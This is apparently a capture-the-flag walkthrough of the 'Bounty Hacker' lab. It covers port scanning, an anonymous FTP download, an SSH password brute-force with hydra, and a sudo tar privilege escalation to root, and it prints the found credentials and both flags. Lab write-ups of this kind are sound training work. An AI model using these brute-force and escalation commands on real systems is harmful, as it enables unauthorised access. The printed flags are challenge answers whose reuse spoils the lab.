# Bounty Hacker

## Description

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

## Initial Scan

We start with an Nmap scan. The scan reveals three open ports:
* 21 ftp
* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.3.156
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## FTP

I start with the FTP service, since anonymous login is allowed. I found two files in there:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Bounty_Hacker/files]
└─$ ftp $IP
Connected to 10.10.182.74.
220 (vsFTPd 3.0.3)
Name (10.10.182.74:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt   <----------
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt    <----------
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.06 secs (7.1135 kB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (53.7702 kB/s)
ftp> exit
221 Goodbye.
~~~

After downloading them, I checked their content. `locks.txt` is a wordlist which we would probably need later and `task.txt` is just a task list but the name of the writer  could be a username:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Bounty_Hacker/files]
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin     <------------------
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Bounty_Hacker/files]
└─$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te

[REDACTED]
~~~

Writer: `lin`

## Brute-forcing SSH servie

Let's try brute-forcing the SSH service using the username and the wordlist (`locks.txt`). I used `hydra` to brute-force and it found the password:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Bounty_Hacker/files]
└─$ hydra -l lin -P ./locks.txt ssh://$IP                            
Hydra v9.3-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-21 06:01:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.182.74:22/
[22][ssh] host: 10.10.182.74   login: lin   password: RedDr4gonSynd1cat3  <---------
1 of 1 target successfully completed, 1 valid password found
~~~

Brute-forced service: `SSH`

Lin's password: `RedDr4gonSynd1cat3`

## User Flag

Let's log into SSH service using the creds (`lin:RedDr4gonSynd1cat3`). We are logged in as user `lin` and the user flag is in `~/Desktop`:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Bounty_Hacker/files]
└─$ ssh lin@$IP
lin@10.10.182.74's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Thu Oct 21 05:03:54 2021 from 10.9.3.156
lin@bountyhacker:~/Desktop$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
~~~

user.txt: `THM{CR1M3_SyNd1C4T3}`

## Root Flag

Now we need to gain root access, in order to obtain the root flag. Let's run `sudo -l` to check our permissions:

~~~
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
~~~

We can run `tar` with sudo and no password. I checked [GTFOBins](https://gtfobins.github.io/) for privilege escalation commands and found one. Let's try it:

~~~
lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
~~~

It worked and now we are root. Let's read the root flag located in `/root`:

~~~
# cd /root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
~~~

root.txt: `THM{80UN7Y_h4cK3r}`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and have a good one! : )